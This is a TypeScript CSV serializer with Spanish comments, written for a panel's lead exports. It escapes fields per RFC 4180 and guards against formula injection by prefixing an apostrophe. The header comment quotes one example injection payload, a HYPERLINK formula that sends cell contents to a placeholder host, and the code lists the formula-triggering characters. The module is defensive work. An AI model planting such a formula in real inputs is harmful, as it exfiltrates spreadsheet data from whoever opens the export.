/*
 * CSV — serializador para los export del panel (§119).
 *
 * Existe como módulo propio y no como tres líneas dentro de la pantalla porque escapar CSV tiene dos
 * trampas, y las dos muerden con datos que vienen de un formulario PÚBLICO:
 *
 *   1. **El escapado de RFC 4180**: una coma, una comilla o un salto de línea dentro de un campo
 *      parten la fila. El mensaje de un lead («Hola, me interesa el apto de Bocagrande») ya trae la
 *      coma de serie: sin comillas, el archivo se abre con las columnas corridas y nadie sabe por qué.
 *
 *   2. **La inyección de fórmulas** (CSV injection / CWE-1236). Excel y Sheets INTERPRETAN un campo
 *      que empieza por `=`, `+`, `-`, `@`, tabulador o retorno de carro. Alguien puede escribir
 *      `=HYPERLINK("http://malo/?d="&A1,"Ver")` en el nombre del formulario público, y al abrir el
 *      export en el portátil del dueño se ejecuta en SU máquina, con SU sesión. No es teórico: es la
 *      vía clásica para exfiltrar una hoja entera desde un campo de texto de una web.
 *
 * La defensa del punto 2 es anteponer un apóstrofo: la celda enseña el texto tal cual y la hoja de
 * cálculo ya no lo trata como fórmula. Se prefiere a borrar el carácter porque un teléfono escrito
 * como `+57 300…` es un dato legítimo que hay que conservar entero.
 */

/** Caracteres que convierten un campo en fórmula al abrir el archivo. */
const ARRANQUES_PELIGROSOS = ['=', '+', '-', '@', '\t', '\r'];

export interface Columna<T> {
  /** Cabecera tal como la verá el dueño en la hoja. */
  titulo: string;
  /** De dónde sale el valor. Devolver `undefined` produce celda vacía, no «undefined». */
  valor: (fila: T) => string | number | boolean | null | undefined;
}

/** Un campo, ya neutralizado y entrecomillado si hace falta. */
export function campoCsv(v: string | number | boolean | null | undefined): string {
  if (v === null || v === undefined) return '';
  let s = String(v);
  if (ARRANQUES_PELIGROSOS.some((c) => s.startsWith(c))) s = `'${s}`;
  // Se entrecomilla siempre que haya coma, comilla, salto o espacio en los bordes; la comilla
  // interna se duplica, que es como manda RFC 4180.
  if (/[",\n\r]/.test(s) || s !== s.trim()) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/**
 * Serializa filas a CSV.
 *
 * Va con BOM: sin él, Excel en Windows abre el archivo en la codificación del sistema y «Cartagena
 * de Indias» sale con la ó rota. El dueño trabaja en Windows y abre esto en Excel.
 */
export function aCsv<T>(filas: readonly T[], columnas: readonly Columna<T>[]): string {
  const cabecera = columnas.map((c) => campoCsv(c.titulo)).join(',');
  const cuerpo = filas.map((f) => columnas.map((c) => campoCsv(c.valor(f))).join(','));
  return '﻿' + [cabecera, ...cuerpo].join('\r\n') + '\r\n';
}

/** Nombre de archivo con la fecha, para que dos export del mismo día no se pisen en Descargas. */
export function nombreExport(que: string, ahora: Date = new Date()): string {
  const d = ahora.toISOString().slice(0, 10);
  const h = ahora.toISOString().slice(11, 16).replace(':', '');
  return `altorra-${que}-${d}-${h}.csv`;
}
